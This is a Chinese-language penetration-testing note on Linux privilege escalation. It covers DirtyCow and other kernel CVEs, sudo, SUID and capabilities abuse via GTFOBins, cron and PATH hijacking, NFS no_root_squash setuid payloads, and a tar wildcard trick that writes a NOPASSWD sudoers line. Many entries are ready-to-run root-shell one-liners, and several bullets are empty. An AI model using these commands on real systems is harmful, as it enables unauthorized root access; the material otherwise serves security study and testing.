##### 内核漏洞利用方法
  1. 获取关于目标系统的内核信息
  2. 通过`exploit-db`或`searchsplopit`等工具搜索具体的内核版本信息
  3. 通过`python3 -m http.server`或`wget`等服务将poc脚本传送至目标主机
  4. 运行漏洞利用poc脚本（需要了解漏洞利用代码的工作原理，避免因为漏洞poc执行等原因对目标系统造成特殊的影响，或漏洞代码需要进行某些交互功能）
##### CVE-2016-5195
大名鼎鼎的脏牛(DirtyCow)提权漏洞。官网：
  * 影响版本：
    * Linux kernel >= 2.6.22（2007年发行，到2016年10月18日才修复）
    * 
  * 漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。
  * 提权利用：
    * 
    * 
    * 
    * 
  * 参考链接：
    * 
##### 其他内核漏洞
Linux Kernel 3.13.0 
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit
Linux Kernel 4.3.3 – 'overlayfs' Local Privilege Escalation
最新的有DirtyPipe和DirtyCred可以了解一下
**CVE-2019-13272**
  * 
  * 
  * 
**CVE-2017-16995**
  * 
  * 
**CVE-2019-14287**
  * 
**内核漏洞提权汇总**
  * 
**内核漏洞提权参考**
  * 
  * CVE-2022-0847
### sudo提权
  1. 使用`sudo -l`查看可利用的sudo权限工具
  2. 在`https://gtfobins.github.io/`搜索对应的工具名称，利用页面中的提示进行提权
例子：
  * `less提权`  
输入`sudo less /etc/profile`  
输入`!/bin/sh`即可提升权限至root  
  * `find提权`  
输入`sudo find . -exec /bin/sh \; -quit`  
  * `nano提权`
    * 输入`sudo nano`  
连续键入`ctrl+r`和`ctrl+x`两个组合键  
输入命令`reset; sh 1>&0 2>&0`提权至root  
    * 输入`sudo nano -s /bin/sh`  
输入`/bin/sh`，再键入`ctrl+t`组合键  
### SUID提权
#### 什么是SUID（[来自P牛博客总结](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)）
通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。
ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux
2.2引入[CAPABILITIES](http://man7.org/linux/man-pages/man7/capabilities.7.html)前，使用Raw
Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里`ls
-al $(which ping)`，可以发现其权限是`-rwsr-xr-x`，其中有个s位，这就是suid：
    root@linux:~# ls -al /bin/ping
    -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping
suid全称是 **S** et owner **U** ser **ID** up on
execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。
设置了s位的程序在运行时，其 **Effective UID**
将会设置为这个程序的所有者。比如，`/bin/ping`这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其
**Effective UID** 就是0，等同于拥有了root权限。
这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID：
  * Real UID 执行该进程的用户实际的UID
  * Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）
  * Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）
通常情况下Effective UID和Real
UID相等，所以普通用户不能写入只有UID=0号才可写的`/etc/passwd`；有suid的程序启动时，Effective
UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。
有的同学说某某程序只要有suid权限，就可以提权，这个说法其实是不准确的。只有这个程序的所有者是0号或其他super
user，同时拥有suid权限，才可以提权。
#### nmap提权
nmap的一些扫描操作需要root权限，通常sudo执行的时候需要输入密码，系统中可能对nmap设置了suid权限便于操作。
  * 在nmap 5.20以前的interactive交互模式可以用于提权  
  * （待定！）新版本我测试的nmap版本为`Nmap version 7.92`  
P牛博客中提到
> 星球里`@A11risefor*`师傅提到，nmap 5.20以后可以通过加载自定义script的方式来执行命令：
>
>>
补充一个，--interactive应该是比较老版本的nmap提供的选项，最近的nmap上都没有这个选项了，不过可以写一个nse脚本，内容为`os.execute('/bin/sh')`，然后`nmap
--script=shell.nse`来提权
>
> 的确是一个非常及时的补充，因为现在大部分的nmap都是没有interactive交互模式了。
>
> 但经过测试我们发现，这个方法启动的shell似乎仍然是当前用户的，并没有我们想象中的提权。
根据我的测试，我在sudoers文件中设置test用户为`test ALL=(ALL:ALL) ALL`权限  
nmap脚本`nse_root.nse`内容为`os.execute("/bin/sh")`，使用test用户执行命令`sudo nmap
--script=/home/test/nse_root.nse`，结果为提权成功  
关于更多nmap提权技巧可以看[nmap提权技巧](https://gtfobins.github.io/gtfobins/nmap/)
#### SUID文件提权
  1. 首先找到设置了`SUID`或`SGID`的文件`find / -type f -perm -04000 -ls 2>/dev/null`
  2. 具有SUID权限的文件，也可以去[GTFOBins](https://gtfobins.github.io/)网站查看SUID利用，网站仅提供参考  
### 利用存在漏洞的命令/服务
Linux存在的命令非常多，可以利用`searchsploit`去搜索工具漏洞
如screen 4.5版本或apache 2或sudo提权
### Capabilities提权
> Linux
> 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在[capabilities(7)
> - Linux manual page](http://man7.org/linux/man-> pages/man7/capabilities.7.html)中看到这些特权的说明。
  1. 利用`getcap -r / 2>/dev/null`查看设置了capabilities的可执行文件
  2. 利用命令提权，可以参考[GTFOBins](https://gtfobins.github.io/#+capabilities)（有些命令不适合所有终端）
        # gbd的利用方法
    ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
    #node的利用方法
    ./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
    #perl的利用方法
    ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
    #php的利用方法
    ./php -r "posix_setuid(0); system('/bin/sh');"
    #pythond的利用方法
    ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
    #ruby的利用方法
    ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
    #rview的利用方法
    ./rview -c ':lua os.execute("reset; exec sh")'
    #rvim的利用方法
    ./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    #view的利用方法
    ./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    #vim的利用方法
    ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    #vimdiff的利用方法
    ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
### CronJob定时任务
定时任务通常被设置用于备份文件、清理目录内容等。crontab命令可以创建一个cron文件，以指定的时间区间运行。
可以查看`/etc/crontab`查看CronJob文件
root用户的crontab能被root用户或完全sudo权限的用户编辑。可以在此时查找一个以root用户身份运行的当前用户可更改的读写脚本。
  1. 找到一个可读写更改的脚本
  2. 更改其内容进行反弹shell的操作
  3. 如果目标机器的CronJob存在，但文件已被删除，如  
如果未定义脚本的完整路径，cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。可以被当前用户利用。
### 环境变量提权
`PATH` 是Linux 和 Unix
操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。
  1. 找到可写目录`find / -writable 2>/dev/null`
  2. 修改PATH的内容，通常将当前用户由执行权限的目录添加至PATH的最先位置，`export $PATH=新添加的目录:$PATH`
  3. 编写脚本，写入想执行的命令。可以是`/bin/bash`或C语言等脚本  
例子：
    * C语言脚本
                #include
        void main()
        {
                setuid(0);
                setgid(0);
                system("bash");
        }
    * python脚本
                /usr/bin/python3
        import os
        import sys
        try: 
                os.system("thm")
        except:
                sys.exit()
  4. chmod u+s 文件设置suid权限
### nfs提权
> 网络文件系统（ **NFS** ）是一个客户端 /
> 服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在 **NFS**
> 协议是几个分布式文件系统标准，网络附加存储（NAS）之一。
>
> NFS 是基于 UDP/IP 协议的应用，其实现主要是采用远程过程调用 RPC 机制，RPC
> 提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC 采用了 XDR 的支持。XDR
> 是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。
利用先遣条件：`no_root_squash`选项得开启
  1. 识别nfs共享，可以利用nmap工具或rpcinfo等工具
        nmap -sV -p111,2049 IP
    #nmap扫描nfs的常用端口111和2049
    rpcinfo -p 192.168.1.171
    #rpcinfo直接枚举nfs
  2.     * 检查nfs配置文件`/etc/exports`，检查开启的nsf共享目录和`no_root_squash`选项设置
    * 利用metasploit或showmount列举目标主机的可用nfs exports
                msf > use auxiliary/scanner/nfs/nfsmount
        msf auxiliary(nfsmount) > set rhosts IP
        msf auxiliary(nfsmount) > run
                showmount -e IP
  3. 挂载nfs exports
        sudo mount -o [options] -t nfs ip_address:share directory_to_mount
  4. 编写脚本，写入想执行的命令。可以是`/bin/bash`或C语言等脚本
例子：
    * C语言脚本
                #include
        void main()
        {
                setuid(0);
                setgid(0);
                system("/bin/bash");
        }
    * python脚本
                /usr/bin/python3
        import os
        import sys
        try: 
                os.system("/bin/bash")
        except:
                sys.exit()
  5. chmod +s 文件添加suid权限
### 通配符提权（技术比较老）
  1. 写入脚本
  2. 利用命令中某些可利用执行脚本的选项，创建具有这些选项名称的文件
  3. tar提权
        echo 'echo "用户名 ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    echo "" > "--checkpoint-action=exec=sh root.sh"
    echo "" > --checkpoint=1
首先需要root用户在root.sh这个自定脚本目录执行tar带参数的压缩命令，才可以触发。如果碰巧遇到了定时压缩文件可写目录的操作，可以一试。
利用截图：  
  4. 类似的通配符还有`chown`和`rsync`
### 共享库提权
> Linux 程序通常使用动态链接的共享对象库。库包含已编译的代码或开发人员用来避免跨多个程序重写相同的代码段的其他数据。Linux
> 中存在两种类型的库：（`static libraries`由 .a 文件扩展名表示）和`dynamically linked shared object
> libraries`（由 .so 文件扩展名表示）。编译程序时，静态库成为程序的一部分，无法更改。但是，可以修改动态库以控制调用它们的程序的执行。
>
> 有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的`-rpath`or`-rpath-> link`标志，使用环境变量`LD_RUN_PATH`or
> `LD_LIBRARY_PATH`，将库放置在`/lib`or`/usr/lib`默认目录中，或者在`/etc/ld.so.conf`配置文件中指定包含库的另一个目录。